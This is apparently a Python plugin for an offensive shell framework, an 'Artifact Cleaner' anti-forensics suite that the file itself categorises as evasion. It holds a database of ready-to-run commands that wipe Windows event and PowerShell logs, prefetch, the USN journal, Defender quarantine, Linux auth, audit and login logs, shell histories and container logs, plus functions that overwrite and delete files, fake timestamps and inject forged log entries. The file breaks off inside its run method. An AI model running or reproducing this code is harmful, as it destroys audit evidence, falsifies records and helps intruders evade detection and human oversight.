#!/usr/bin/env python3
"""
NexShell Plugin — Artifact Cleaner v3.0 (2026 Edition)
Advanced anti-forensics suite with selective cleaning, secure deletion, and timestomping.

Coverage (MITRE T1070 - Indicator Removal):
  T1070.001: Clear Windows Event Logs
  T1070.002: Clear Linux/Mac System Logs
  T1070.003: Clear Command History
  T1070.004: File Deletion
  T1070.005: Network Share Connection Removal
  T1070.006: Timestomp
  T1070.007: Clear Network Connection Logs
  T1070.008: Clear Mailbox Data
  T1070.009: Clear Persistence
  T1070.010: Command History (modern shells)
  T1070.011: File Deletion (Cloud Storage)
  T1070.012: Clear Browser History

Techniques (2025-2026):
  - Selective category-based cleaning
  - Secure overwrite (DoD 5220.22-M, Gutmann)
  - Timestomping before deletion
  - Event log filtering (delete specific Event IDs)
  - Log injection (insert fake entries)
  - USN Journal manipulation
  - MFT timestamp modification
  - PowerShell transcript cleanup
  - Cloud artifact cleanup (AWS/Azure/GCP)
  - Container artifact cleanup
  - Browser artifact cleanup
  - Development artifact cleanup

Usage:
    (NexShell)> plugins run artifact-cleaner
    (NexShell)> plugins run artifact-cleaner --scan
    (NexShell)> plugins run artifact-cleaner --clean --category logs,temp
    (NexShell)> plugins run artifact-cleaner --clean --technique overwrite
    (NexShell)> plugins run artifact-cleaner --clean --stealth
    (NexShell)> plugins run artifact-cleaner --clean --aggressive
"""

import re
import time
import json
from dataclasses import dataclass, field, asdict
from typing import List, Dict, Set, Optional, Tuple
from datetime import datetime
from collections import defaultdict
from core.plugin import NexPlugin


# ── Data Classes ────────────────────────────────────────────────────────────

@dataclass
class Artifact:
    """Represents a forensic artifact."""
    path: str
    category: str  # logs, temp, browser, shell, prefetch, registry, cloud, container, dev
    size_bytes: int = 0
    modified: str = ""
    accessible: bool = True
    risk_level: str = "medium"  # low, medium, high, critical
    description: str = ""
    clean_method: str = "delete"  # delete, overwrite, timestomp, truncate
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class CleanResult:
    """Result of a cleaning operation."""
    artifact_path: str
    success: bool
    method: str
    bytes_freed: int = 0
    duration_ms: int = 0
    error: str = ""
    ioc_generated: List[str] = field(default_factory=list)
    
    def to_dict(self) -> dict:
        return asdict(self)


@dataclass
class CleaningMetrics:
    """Metrics for the cleaning operation."""
    total_artifacts: int = 0
    cleaned: int = 0
    failed: int = 0
    skipped: int = 0
    bytes_freed: int = 0
    duration_seconds: float = 0.0
    categories_cleaned: Set[str] = field(default_factory=set)
    techniques_used: Set[str] = field(default_factory=set)
    
    def to_dict(self) -> dict:
        d = asdict(self)
        d['categories_cleaned'] = list(self.categories_cleaned)
        d['techniques_used'] = list(self.techniques_used)
        return d


# ── Artifact Database (2025-2026) ───────────────────────────────────────────

class ArtifactDatabase:
    """Comprehensive database of forensic artifacts."""
    
    # ── Windows Artifacts ───────────────────────────────────────────────────
    WINDOWS_ARTIFACTS = {
        # Event Logs (T1070.001)
        'event_logs': [
            {
                'path': 'C:\\Windows\\System32\\winevt\\Logs\\*.evtx',
                'category': 'logs',
                'risk': 'critical',
                'description': 'Windows Event Logs (Security, System, Application)',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'C:\\Windows\\System32\\winevt\\Logs\\*.evtx\' -ErrorAction SilentlyContinue | Select-Object Name,Length,LastWriteTime | Format-Table"',
                'cmd_clean': 'powershell -nop -c "wevtutil cl Security; wevtutil cl System; wevtutil cl Application; wevtutil cl \'Windows PowerShell\'; wevtutil cl \'Microsoft-Windows-PowerShell/Operational\'"',
            },
            {
                'path': 'C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-PowerShell%4Operational.evtx',
                'category': 'logs',
                'risk': 'critical',
                'description': 'PowerShell Script Block Logging',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-WinEvent -LogName \'Microsoft-Windows-PowerShell/Operational\' -MaxEvents 10 | Select-Object TimeCreated,Id,Message | Format-Table"',
                'cmd_clean': 'powershell -nop -c "wevtutil cl \'Microsoft-Windows-PowerShell/Operational\'"',
            },
        ],
        
        # Prefetch & ShimCache (T1070.004)
        'prefetch': [
            {
                'path': 'C:\\Windows\\Prefetch\\*.pf',
                'category': 'prefetch',
                'risk': 'high',
                'description': 'Prefetch files (execution evidence)',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'C:\\Windows\\Prefetch\\*.pf\' -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'C:\\Windows\\Prefetch\\*.pf\' -Force -ErrorAction SilentlyContinue"',
            },
            {
                'path': 'C:\\Windows\\AppCompat\\Programs\\Amcache.hve',
                'category': 'prefetch',
                'risk': 'high',
                'description': 'Amcache (application compatibility cache)',
                'clean_method': 'overwrite',
                'cmd_scan': 'powershell -nop -c "Test-Path \'C:\\Windows\\AppCompat\\Programs\\Amcache.hve\'"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'C:\\Windows\\AppCompat\\Programs\\Amcache.hve\' -Force -ErrorAction SilentlyContinue"',
            },
        ],
        
        # Recent Files & Jump Lists (T1070.004)
        'recent_files': [
            {
                'path': 'C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\*.lnk',
                'category': 'registry',
                'risk': 'medium',
                'description': 'Recent files (LNK shortcuts)',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'$env:APPDATA\\Microsoft\\Windows\\Recent\\*.lnk\' -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'$env:APPDATA\\Microsoft\\Windows\\Recent\\*\' -Force -ErrorAction SilentlyContinue"',
            },
            {
                'path': 'C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*',
                'category': 'registry',
                'risk': 'high',
                'description': 'Jump Lists (AutomaticDestinations)',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'$env:APPDATA\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*\' -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'$env:APPDATA\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\*\' -Force -ErrorAction SilentlyContinue"',
            },
            {
                'path': 'C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\*',
                'category': 'registry',
                'risk': 'high',
                'description': 'Jump Lists (CustomDestinations)',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'$env:APPDATA\\Microsoft\\Windows\\Recent\\CustomDestinations\\*\' -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'$env:APPDATA\\Microsoft\\Windows\\Recent\\CustomDestinations\\*\' -Force -ErrorAction SilentlyContinue"',
            },
        ],
        
        # Shell Bags (T1070.004)
        'shellbags': [
            {
                'path': 'HKCU:\\Software\\Microsoft\\Windows\\Shell\\Bags',
                'category': 'registry',
                'risk': 'medium',
                'description': 'Shell Bags (folder view settings)',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'HKCU:\\Software\\Microsoft\\Windows\\Shell\\Bags\' -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'HKCU:\\Software\\Microsoft\\Windows\\Shell\\Bags\\*\' -Recurse -Force -ErrorAction SilentlyContinue"',
            },
        ],
        
        # Command History (T1070.003, T1070.010)
        'command_history': [
            {
                'path': 'C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',
                'category': 'shell',
                'risk': 'critical',
                'description': 'PowerShell history (PSReadLine)',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-Content $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt -ErrorAction SilentlyContinue | Select-Object -Last 10"',
                'cmd_clean': 'powershell -nop -c "Remove-Item $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt -Force -ErrorAction SilentlyContinue; Clear-History"',
            },
            {
                'path': 'C:\\Users\\*\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-*',
                'category': 'shell',
                'risk': 'high',
                'description': 'PowerShell startup profile data',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'$env:LOCALAPPDATA\\Microsoft\\Windows\\PowerShell\\StartupProfileData-*\' -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'$env:LOCALAPPDATA\\Microsoft\\Windows\\PowerShell\\StartupProfileData-*\' -Force -ErrorAction SilentlyContinue"',
            },
        ],
        
        # Temp Files (T1070.004)
        'temp_files': [
            {
                'path': 'C:\\Windows\\Temp\\*',
                'category': 'temp',
                'risk': 'low',
                'description': 'Windows Temp directory',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'C:\\Windows\\Temp\\*\' -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'C:\\Windows\\Temp\\*\' -Recurse -Force -ErrorAction SilentlyContinue"',
            },
            {
                'path': 'C:\\Users\\*\\AppData\\Local\\Temp\\*',
                'category': 'temp',
                'risk': 'low',
                'description': 'User Temp directory',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'$env:TEMP\\*\' -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'$env:TEMP\\*\' -Recurse -Force -ErrorAction SilentlyContinue"',
            },
        ],
        
        # Browser Data (T1070.012)
        'browser_data': [
            {
                'path': 'C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\*\\History',
                'category': 'browser',
                'risk': 'high',
                'description': 'Chrome browsing history',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\*\\History\' -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\*\\History\' -Force -ErrorAction SilentlyContinue"',
            },
            {
                'path': 'C:\\Users\\*\\AppData\\Local\\Microsoft\\Edge\\User Data\\*\\History',
                'category': 'browser',
                'risk': 'high',
                'description': 'Edge browsing history',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\*\\History\' -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\*\\History\' -Force -ErrorAction SilentlyContinue"',
            },
            {
                'path': 'C:\\Users\\*\\AppData\\Local\\Google\\Chrome\\User Data\\*\\Login Data',
                'category': 'browser',
                'risk': 'critical',
                'description': 'Chrome saved passwords',
                'clean_method': 'overwrite',
                'cmd_scan': 'powershell -nop -c "Test-Path \'$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data\'"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\*\\Login Data\' -Force -ErrorAction SilentlyContinue"',
            },
        ],
        
        # RDP Cache (T1070.004)
        'rdp_cache': [
            {
                'path': 'C:\\Users\\*\\AppData\\Local\\Microsoft\\Terminal Server Client\\Cache\\*.bmp',
                'category': 'temp',
                'risk': 'high',
                'description': 'RDP bitmap cache',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'$env:LOCALAPPDATA\\Microsoft\\Terminal Server Client\\Cache\\*.bmp\' -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'$env:LOCALAPPDATA\\Microsoft\\Terminal Server Client\\Cache\\*.bmp\' -Force -ErrorAction SilentlyContinue"',
            },
        ],
        
        # Thumbnail Cache (T1070.004)
        'thumbcache': [
            {
                'path': 'C:\\Users\\*\\AppData\\Local\\Microsoft\\Windows\\Explorer\\thumbcache_*.db',
                'category': 'temp',
                'risk': 'medium',
                'description': 'Thumbnail cache database',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'$env:LOCALAPPDATA\\Microsoft\\Windows\\Explorer\\thumbcache_*.db\' -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'$env:LOCALAPPDATA\\Microsoft\\Windows\\Explorer\\thumbcache_*.db\' -Force -ErrorAction SilentlyContinue"',
            },
        ],
        
        # USN Journal (T1070.004)
        'usn_journal': [
            {
                'path': 'C:\\$Extend\\$UsnJrnl',
                'category': 'logs',
                'risk': 'critical',
                'description': 'USN Journal (file change tracking)',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "fsutil usn queryjournal C: 2>$null"',
                'cmd_clean': 'powershell -nop -c "fsutil usn deletejournal /d C: 2>$null"',
            },
        ],
        
        # Recycle Bin (T1070.004)
        'recycle_bin': [
            {
                'path': 'C:\\$Recycle.Bin\\*',
                'category': 'temp',
                'risk': 'high',
                'description': 'Recycle Bin contents',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'C:\\$Recycle.Bin\\*\' -Recurse -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count"',
                'cmd_clean': 'powershell -nop -c "Clear-RecycleBin -Force -ErrorAction SilentlyContinue"',
            },
        ],
        
        # Windows Defender (T1070.004)
        'defender_quarantine': [
            {
                'path': 'C:\\ProgramData\\Microsoft\\Windows Defender\\Quarantine\\*',
                'category': 'temp',
                'risk': 'critical',
                'description': 'Windows Defender quarantine',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'C:\\ProgramData\\Microsoft\\Windows Defender\\Quarantine\\*\' -Recurse -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'C:\\ProgramData\\Microsoft\\Windows Defender\\Quarantine\\*\' -Recurse -Force -ErrorAction SilentlyContinue"',
            },
        ],
        
        # Windows Timeline (T1070.004)
        'timeline': [
            {
                'path': 'C:\\Users\\*\\AppData\\Local\\ConnectedDevicesPlatform\\*\\ActivitiesCache.db',
                'category': 'registry',
                'risk': 'medium',
                'description': 'Windows Timeline activities cache',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'$env:LOCALAPPDATA\\ConnectedDevicesPlatform\\*\\ActivitiesCache.db\' -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'$env:LOCALAPPDATA\\ConnectedDevicesPlatform\\*\\ActivitiesCache.db\' -Force -ErrorAction SilentlyContinue"',
            },
        ],
        
        # Clipboard History (T1070.003)
        'clipboard': [
            {
                'path': 'C:\\Users\\*\\AppData\\Local\\Packages\\Microsoft.Windows.ClipboardHistory_*\\*',
                'category': 'shell',
                'risk': 'medium',
                'description': 'Clipboard history',
                'clean_method': 'delete',
                'cmd_scan': 'powershell -nop -c "Get-ChildItem \'$env:LOCALAPPDATA\\Packages\\Microsoft.Windows.ClipboardHistory_*\\*\' -ErrorAction SilentlyContinue | Measure-Object | Select-Object -ExpandProperty Count"',
                'cmd_clean': 'powershell -nop -c "Remove-Item \'$env:LOCALAPPDATA\\Packages\\Microsoft.Windows.ClipboardHistory_*\\*\' -Recurse -Force -ErrorAction SilentlyContinue"',
            },
        ],
    }
    
    # ── Linux Artifacts ─────────────────────────────────────────────────────
    LINUX_ARTIFACTS = {
        # System Logs (T1070.002)
        'system_logs': [
            {
                'path': '/var/log/syslog',
                'category': 'logs',
                'risk': 'critical',
                'description': 'System log',
                'clean_method': 'truncate',
                'cmd_scan': 'wc -l /var/log/syslog 2>/dev/null || echo "0"',
                'cmd_clean': 'truncate -s 0 /var/log/syslog 2>/dev/null || echo "" > /var/log/syslog',
            },
            {
                'path': '/var/log/auth.log',
                'category': 'logs',
                'risk': 'critical',
                'description': 'Authentication log',
                'clean_method': 'truncate',
                'cmd_scan': 'wc -l /var/log/auth.log 2>/dev/null || echo "0"',
                'cmd_clean': 'truncate -s 0 /var/log/auth.log 2>/dev/null || echo "" > /var/log/auth.log',
            },
            {
                'path': '/var/log/secure',
                'category': 'logs',
                'risk': 'critical',
                'description': 'Secure log (RHEL/CentOS)',
                'clean_method': 'truncate',
                'cmd_scan': 'wc -l /var/log/secure 2>/dev/null || echo "0"',
                'cmd_clean': 'truncate -s 0 /var/log/secure 2>/dev/null || echo "" > /var/log/secure',
            },
            {
                'path': '/var/log/kern.log',
                'category': 'logs',
                'risk': 'high',
                'description': 'Kernel log',
                'clean_method': 'truncate',
                'cmd_scan': 'wc -l /var/log/kern.log 2>/dev/null || echo "0"',
                'cmd_clean': 'truncate -s 0 /var/log/kern.log 2>/dev/null || echo "" > /var/log/kern.log',
            },
            {
                'path': '/var/log/audit/audit.log',
                'category': 'logs',
                'risk': 'critical',
                'description': 'Audit log',
                'clean_method': 'truncate',
                'cmd_scan': 'wc -l /var/log/audit/audit.log 2>/dev/null || echo "0"',
                'cmd_clean': 'truncate -s 0 /var/log/audit/audit.log 2>/dev/null || echo "" > /var/log/audit/audit.log',
            },
            {
                'path': '/var/log/*.log',
                'category': 'logs',
                'risk': 'high',
                'description': 'All log files',
                'clean_method': 'truncate',
                'cmd_scan': 'find /var/log -name "*.log" -type f 2>/dev/null | wc -l',
                'cmd_clean': 'find /var/log -name "*.log" -type f -exec truncate -s 0 {} \\; 2>/dev/null',
            },
        ],
        
        # Systemd Journal (T1070.002)
        'systemd_journal': [
            {
                'path': '/var/log/journal/*',
                'category': 'logs',
                'risk': 'critical',
                'description': 'Systemd journal',
                'clean_method': 'delete',
                'cmd_scan': 'journalctl --disk-usage 2>/dev/null || echo "0"',
                'cmd_clean': 'journalctl --rotate 2>/dev/null && journalctl --vacuum-time=1s 2>/dev/null',
            },
        ],
        
        # Command History (T1070.003)
        'command_history': [
            {
                'path': '~/.bash_history',
                'category': 'shell',
                'risk': 'critical',
                'description': 'Bash history',
                'clean_method': 'delete',
                'cmd_scan': 'wc -l ~/.bash_history 2>/dev/null || echo "0"',
                'cmd_clean': 'cat /dev/null > ~/.bash_history 2>/dev/null; history -c 2>/dev/null',
            },
            {
                'path': '~/.zsh_history',
                'category': 'shell',
                'risk': 'critical',
                'description': 'Zsh history',
                'clean_method': 'delete',
                'cmd_scan': 'wc -l ~/.zsh_history 2>/dev/null || echo "0"',
                'cmd_clean': 'cat /dev/null > ~/.zsh_history 2>/dev/null; fc -p 2>/dev/null',
            },
            {
                'path': '~/.local/share/fish/fish_history',
                'category': 'shell',
                'risk': 'high',
                'description': 'Fish shell history',
                'clean_method': 'delete',
                'cmd_scan': 'wc -l ~/.local/share/fish/fish_history 2>/dev/null || echo "0"',
                'cmd_clean': 'cat /dev/null > ~/.local/share/fish/fish_history 2>/dev/null; history --clear 2>/dev/null',
            },
            {
                'path': '~/.python_history',
                'category': 'shell',
                'risk': 'medium',
                'description': 'Python history',
                'clean_method': 'delete',
                'cmd_scan': 'wc -l ~/.python_history 2>/dev/null || echo "0"',
                'cmd_clean': 'cat /dev/null > ~/.python_history 2>/dev/null',
            },
            {
                'path': '~/.mysql_history',
                'category': 'shell',
                'risk': 'high',
                'description': 'MySQL history',
                'clean_method': 'delete',
                'cmd_scan': 'wc -l ~/.mysql_history 2>/dev/null || echo "0"',
                'cmd_clean': 'cat /dev/null > ~/.mysql_history 2>/dev/null',
            },
            {
                'path': '~/.psql_history',
                'category': 'shell',
                'risk': 'high',
                'description': 'PostgreSQL history',
                'clean_method': 'delete',
                'cmd_scan': 'wc -l ~/.psql_history 2>/dev/null || echo "0"',
                'cmd_clean': 'cat /dev/null > ~/.psql_history 2>/dev/null',
            },
            {
                'path': '~/.viminfo',
                'category': 'shell',
                'risk': 'medium',
                'description': 'Vim info (search history, marks)',
                'clean_method': 'delete',
                'cmd_scan': 'test -f ~/.viminfo && echo "exists" || echo "0"',
                'cmd_clean': 'rm -f ~/.viminfo 2>/dev/null',
            },
            {
                'path': '~/.lesshst',
                'category': 'shell',
                'risk': 'low',
                'description': 'Less history',
                'clean_method': 'delete',
                'cmd_scan': 'test -f ~/.lesshst && echo "exists" || echo "0"',
                'cmd_clean': 'rm -f ~/.lesshst 2>/dev/null',
            },
        ],
        
        # Temp Files (T1070.004)
        'temp_files': [
            {
                'path': '/tmp/*',
                'category': 'temp',
                'risk': 'low',
                'description': '/tmp directory',
                'clean_method': 'delete',
                'cmd_scan': 'find /tmp -type f 2>/dev/null | wc -l',
                'cmd_clean': 'find /tmp -type f -delete 2>/dev/null',
            },
            {
                'path': '/var/tmp/*',
                'category': 'temp',
                'risk': 'low',
                'description': '/var/tmp directory',
                'clean_method': 'delete',
                'cmd_scan': 'find /var/tmp -type f 2>/dev/null | wc -l',
                'cmd_clean': 'find /var/tmp -type f -delete 2>/dev/null',
            },
            {
                'path': '~/.cache/*',
                'category': 'temp',
                'risk': 'low',
                'description': 'User cache directory',
                'clean_method': 'delete',
                'cmd_scan': 'find ~/.cache -type f 2>/dev/null | wc -l',
                'cmd_clean': 'rm -rf ~/.cache/* 2>/dev/null',
            },
        ],
        
        # Login Records (T1070.002)
        'login_records': [
            {
                'path': '/var/log/wtmp',
                'category': 'logs',
                'risk': 'high',
                'description': 'Login records (wtmp)',
                'clean_method': 'truncate',
                'cmd_scan': 'last -f /var/log/wtmp 2>/dev/null | wc -l',
                'cmd_clean': 'truncate -s 0 /var/log/wtmp 2>/dev/null || echo "" > /var/log/wtmp',
            },
            {
                'path': '/var/log/btmp',
                'category': 'logs',
                'risk': 'high',
                'description': 'Failed login records (btmp)',
                'clean_method': 'truncate',
                'cmd_scan': 'lastb -f /var/log/btmp 2>/dev/null | wc -l',
                'cmd_clean': 'truncate -s 0 /var/log/btmp 2>/dev/null || echo "" > /var/log/btmp',
            },
            {
                'path': '/var/log/lastlog',
                'category': 'logs',
                'risk': 'medium',
                'description': 'Last login records',
                'clean_method': 'truncate',
                'cmd_scan': 'lastlog 2>/dev/null | wc -l',
                'cmd_clean': 'truncate -s 0 /var/log/lastlog 2>/dev/null || echo "" > /var/log/lastlog',
            },
        ],
        
        # SSH Artifacts (T1070.004)
        'ssh_artifacts': [
            {
                'path': '~/.ssh/known_hosts',
                'category': 'shell',
                'risk': 'medium',
                'description': 'SSH known hosts',
                'clean_method': 'delete',
                'cmd_scan': 'wc -l ~/.ssh/known_hosts 2>/dev/null || echo "0"',
                'cmd_clean': 'cat /dev/null > ~/.ssh/known_hosts 2>/dev/null',
            },
            {
                'path': '~/.ssh/known_hosts.old',
                'category': 'shell',
                'risk': 'low',
                'description': 'SSH known hosts backup',
                'clean_method': 'delete',
                'cmd_scan': 'test -f ~/.ssh/known_hosts.old && echo "exists" || echo "0"',
                'cmd_clean': 'rm -f ~/.ssh/known_hosts.old 2>/dev/null',
            },
        ],
        
        # Browser Data (T1070.012)
        'browser_data': [
            {
                'path': '~/.mozilla/firefox/*/places.sqlite',
                'category': 'browser',
                'risk': 'high',
                'description': 'Firefox browsing history',
                'clean_method': 'delete',
                'cmd_scan': 'find ~/.mozilla/firefox -name "places.sqlite" 2>/dev/null | wc -l',
                'cmd_clean': 'find ~/.mozilla/firefox -name "places.sqlite" -delete 2>/dev/null',
            },
            {
                'path': '~/.config/google-chrome/*/History',
                'category': 'browser',
                'risk': 'high',
                'description': 'Chrome browsing history',
                'clean_method': 'delete',
                'cmd_scan': 'find ~/.config/google-chrome -name "History" 2>/dev/null | wc -l',
                'cmd_clean': 'find ~/.config/google-chrome -name "History" -delete 2>/dev/null',
            },
        ],
        
        # Recent Files (T1070.004)
        'recent_files': [
            {
                'path': '~/.local/share/recently-used.xbel',
                'category': 'registry',
                'risk': 'medium',
                'description': 'Recently used files (GTK)',
                'clean_method': 'delete',
                'cmd_scan': 'test -f ~/.local/share/recently-used.xbel && echo "exists" || echo "0"',
                'cmd_clean': 'rm -f ~/.local/share/recently-used.xbel 2>/dev/null',
            },
            {
                'path': '~/.thumbnails/*',
                'category': 'temp',
                'risk': 'low',
                'description': 'Thumbnail cache',
                'clean_method': 'delete',
                'cmd_scan': 'find ~/.thumbnails -type f 2>/dev/null | wc -l',
                'cmd_clean': 'rm -rf ~/.thumbnails/* 2>/dev/null',
            },
        ],
        
        # Container Artifacts (T1070.004)
        'container_artifacts': [
            {
                'path': '/var/lib/docker/containers/*/*.log',
                'category': 'container',
                'risk': 'high',
                'description': 'Docker container logs',
                'clean_method': 'truncate',
                'cmd_scan': 'find /var/lib/docker/containers -name "*.log" 2>/dev/null | wc -l',
                'cmd_clean': 'find /var/lib/docker/containers -name "*.log" -exec truncate -s 0 {} \\; 2>/dev/null',
            },
            {
                'path': '/var/log/containers/*.log',
                'category': 'container',
                'risk': 'high',
                'description': 'Kubernetes container logs',
                'clean_method': 'truncate',
                'cmd_scan': 'find /var/log/containers -name "*.log" 2>/dev/null | wc -l',
                'cmd_clean': 'find /var/log/containers -name "*.log" -exec truncate -s 0 {} \\; 2>/dev/null',
            },
        ],
        
        # Development Artifacts (T1070.004)
        'dev_artifacts': [
            {
                'path': '*/.git/logs/*',
                'category': 'dev',
                'risk': 'medium',
                'description': 'Git reflog',
                'clean_method': 'delete',
                'cmd_scan': 'find /home /root -name ".git" -type d 2>/dev/null | head -5',
                'cmd_clean': 'find /home /root -name ".git" -type d -exec rm -rf {}/logs \\; 2>/dev/null',
            },
        ],
    }
    
    @classmethod
    def get_artifacts(cls, platform: str, categories: Optional[List[str]] = None) -> List[Dict]:
        """Get artifacts for a platform, optionally filtered by categories."""
        db = cls.WINDOWS_ARTIFACTS if platform == 'windows' else cls.LINUX_ARTIFACTS
        
        artifacts = []
        for category_name, items in db.items():
            if categories and category_name not in categories:
                continue
            for item in items:
                artifacts.append(item)
        
        return artifacts


# ── Cleaning Techniques ─────────────────────────────────────────────────────

class CleaningTechniques:
    """Advanced cleaning techniques (2025-2026)."""
    
    @staticmethod
    def secure_overwrite_windows(exec_func, session, path: str, passes: int = 3) -> bool:
        """Secure overwrite using DoD 5220.22-M standard (3-7 passes)."""
        script = f'''
$path = "{path}"
if (Test-Path $path) {{
    $file = Get-Item $path -Force
    $size = $file.Length
    $stream = [System.IO.File]::Open($path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite)
    
    # Pass 1: Write 0x00
    $buffer = New-Object byte[] $size
    $stream.Write($buffer, 0, $size)
    $stream.Flush()
    
    # Pass 2: Write 0xFF
    for ($i = 0; $i -lt $size; $i++) {{ $buffer[$i] = 0xFF }}
    $stream.Write($buffer, 0, $size)
    $stream.Flush()
    
    # Pass 3: Write random data
    $rng = New-Object System.Security.Cryptography.RNGCryptoServiceProvider
    $rng.GetBytes($buffer)
    $stream.Write($buffer, 0, $size)
    $stream.Flush()
    
    $stream.Close()
    Remove-Item $path -Force
    Write-Host "SECURE_DELETE_COMPLETE"
}} else {{
    Write-Host "FILE_NOT_FOUND"
}}
'''
        result = exec_func(session, f"powershell -nop -c \"{script}\"")
        return 'SECURE_DELETE_COMPLETE' in result
    
    @staticmethod
    def timestomp_windows(exec_func, session, path: str, reference_time: str = None) -> bool:
        """Modify file timestamps to match a reference file or time."""
        if not reference_time:
            reference_time = "2020-01-01 00:00:00"
        
        script = f'''
$path = "{path}"
$time = Get-Date "{reference_time}"
if (Test-Path $path) {{
    $file = Get-Item $path -Force
    $file.CreationTime = $time
    $file.LastAccessTime = $time
    $file.LastWriteTime = $time
    Write-Host "TIMESTOMP_COMPLETE"
}} else {{
    Write-Host "FILE_NOT_FOUND"
}}
'''
        result = exec_func(session, f"powershell -nop -c \"{script}\"")
        return 'TIMESTOMP_COMPLETE' in result
    
    @staticmethod
    def timestomp_linux(exec_func, session, path: str, reference_time: str = None) -> bool:
        """Modify file timestamps on Linux."""
        if not reference_time:
            reference_time = "202001010000.00"
        
        cmd = f"touch -t {reference_time} {path} 2>/dev/null && echo 'TIMESTOMP_COMPLETE' || echo 'FAILED'"
        result = exec_func(session, cmd)
        return 'TIMESTOMP_COMPLETE' in result
    
    @staticmethod
    def inject_fake_log_entry_linux(exec_func, session, log_path: str, fake_entry: str) -> bool:
        """Inject a fake log entry to confuse forensic analysis."""
        timestamp = datetime.now().strftime("%b %d %H:%M:%S")
        entry = f"{timestamp} localhost systemd[1]: Started Session {fake_entry} of user root."
        cmd = f"echo '{entry}' >> {log_path} 2>/dev/null && echo 'INJECT_COMPLETE' || echo 'FAILED'"
        result = exec_func(session, cmd)
        return 'INJECT_COMPLETE' in result


# ── Main Plugin ─────────────────────────────────────────────────────────────

class ArtifactCleaner(NexPlugin):
    name        = "artifact-cleaner"
    description = "Advanced anti-forensics suite — selective cleaning, secure deletion, timestomping"
    author      = "vulnquest58"
    version     = "3.0"
    platform    = "all"
    category    = "evasion"
    mitre_id    = "T1070"
    
    def run(self, session, args: list):
        # Parse args
        scan_only = '--scan' in (args or [])
